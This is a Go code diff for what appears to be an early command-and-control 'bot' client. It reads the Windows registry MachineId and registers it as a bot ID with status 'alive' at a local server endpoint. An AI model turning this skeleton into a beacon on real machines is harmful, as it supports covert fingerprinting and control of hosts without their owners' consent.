@@ -4,36 +4,57 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
+	"golang.org/x/sys/windows/registry"
 	"log"
-	"math/rand"
 	"net/http"
-	"time"
+	"strings"
 )
 
-func main() {
-	s1 := rand.NewSource(time.Now().UnixNano())
-	r1 := rand.New(s1)
-	idnum := r1.Intn(10000)
-	fmt.Print(idnum)
+type bot struct {
+	Id     string `json:"bot_id"`
+	Status string `json:"status"`
+}
 
-	postBody, _ := json.Marshal(map[string]string{
-		"id":     string(idnum),
-		"status": "alive",
-	})
-	responseBody := bytes.NewBuffer(postBody)
+func getmachineid() string {
+	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\SQMClient`, registry.QUERY_VALUE)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer k.Close()
 
-	resp, err := http.Post("http://127.0.0.1:8081/register", "application/json", responseBody)
+	s, _, err := k.GetStringValue("MachineId")
+	s2 := strings.Trim(s, "{}")
+	if err != nil {
+		log.Fatal(err)
+	}
+	fmt.Println(s2)
+
+	return s2
+}
+
+func register() {
+	idnum := getmachineid()
+
+	b := bot{
+		Id:     idnum,
+		Status: "alive",
+	}
+
+	postBody, _ := json.Marshal(b)
+
+	resp, err := http.Post("http://127.0.0.1:8081/register", "application/json", bytes.NewBuffer(postBody))
 	//Handle Error
 	if err != nil {
 		log.Fatalf("An Error Occured %v", err)
 	}
 	defer resp.Body.Close()
+}
 
-	body, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		log.Fatalln(err)
-	}
-	sb := string(body)
-	log.Printf(sb)
+func main() {
+
+	register()
+
+	//for true {
+	//	//time.Sleep(3*time.Second)
+	//}
 }
